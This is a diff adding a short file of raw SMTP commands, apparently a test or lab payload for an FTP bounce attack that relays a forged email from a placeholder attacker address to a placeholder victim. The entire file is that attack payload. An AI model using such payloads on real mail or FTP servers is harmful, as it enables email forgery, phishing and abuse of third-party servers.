@@ -1,0 +1,9 @@
+HELO attacker.com
+MAIL FROM: attacker@attacker.com
+RCPT TO: victim@victim.com
+DATA
+Subject: Test Email
+
+This is a forged email sent via the FTP bounce attack.
+.
+QUIT
